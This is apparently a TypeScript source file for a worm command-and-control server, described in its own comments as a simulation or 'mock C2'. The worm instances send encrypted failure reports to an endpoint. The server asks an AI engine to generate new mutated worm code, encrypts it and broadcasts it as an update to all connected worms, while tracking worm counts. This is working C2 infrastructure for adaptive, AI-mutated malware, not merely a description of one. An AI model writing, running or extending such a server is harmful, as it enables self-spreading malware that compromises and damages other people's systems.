import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { logger } from './utils/logger';
import { encrypt, decrypt } from './modules/crypto';
import { generateMutation } from './modules/ai';
import { ErrorLog } from '../types/index';

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: "*", // Allow all origins for this simulation
    }
});

const PORT = process.env.C2_PORT || 4000;

// FIX: Cast middleware to 'any' to resolve a type mismatch error. This is a workaround for a likely issue with conflicting @types/express versions or tsconfig settings.
app.use(express.json() as any);

// Type guard to check if an object is a valid ErrorLog
function isErrorLog(obj: any): obj is ErrorLog {
    return obj && typeof obj.type === 'string' && typeof obj.details === 'string' && typeof obj.targetIp === 'string';
}

// Endpoint for worms to report failures
// FIX: Removed explicit Request and Response types from handler to allow type inference, which resolves property access errors on req.body and res.status. This is likely needed due to a type conflict in the project setup.
app.post('/api/report', async (req, res) => {
    const { instanceId, payload, key } = req.body;
    
    if (!instanceId || !payload || !key) {
        logger.warn('C2 Server: Received invalid report (missing instanceId, payload, or key).');
        return res.status(400).send('Invalid report format');
    }

    try {
        const decryptedReport = decrypt(payload, key);
        if (!isErrorLog(decryptedReport)) {
            throw new Error('Decryption failed or payload is not a valid ErrorLog.');
        }
        logger.info(`C2 Server: Received valid report from instance ${instanceId}: ${JSON.stringify(decryptedReport)}`);
        
        io.emit('worm_event', {
            type: 'report',
            instanceId,
            data: decryptedReport,
        });

        logger.info(`C2 Server: Requesting new mutation from AI engine...`);
        const aiGeneratedCode = await generateMutation(decryptedReport);

        if (!aiGeneratedCode) {
            logger.error(`C2 Server: AI Engine failed to provide a mutation. No update will be broadcast.`);
            return res.status(500).json({ message: 'AI engine failed, report received but no mutation generated.' });
        }
        
        logger.info(`C2 Server: Broadcasting AI-generated mutation to all clients.`);
        
        const encryptedCode = encrypt({ code: aiGeneratedCode }, key);
        
        io.emit('update', { payload: encryptedCode, key });
        
        io.emit('worm_event', {
            type: 'mutation',
            instanceId,
            data: { mutation: `AI Generated: ${aiGeneratedCode.substring(0, 80)}...` }
        });

        res.status(200).json({ message: 'Report received and AI-generated mutation broadcasted.' });

    } catch (e: any) {
        logger.error(`C2 Server: Failed to process report from ${instanceId}. Error: ${e.message}`);
        res.status(500).send('Error processing report.');
    }
});

io.on('connection', (socket) => {
    logger.info(`C2 Server: Client connected: ${socket.id}`);
    
    io.emit('worm_event', {
        type: 'connect',
        instanceId: socket.id,
        data: { wormCount: io.engine.clientsCount }
    });

    socket.on('disconnect', () => {
        logger.info(`C2 Server: Client disconnected: ${socket.id}`);
        io.emit('worm_event', {
            type: 'disconnect',
            instanceId: socket.id,
            data: { wormCount: io.engine.clientsCount }
        });
    });
});

httpServer.listen(PORT, () => {
    logger.info(`Mock C2 server is listening on http://localhost:${PORT}`);
});
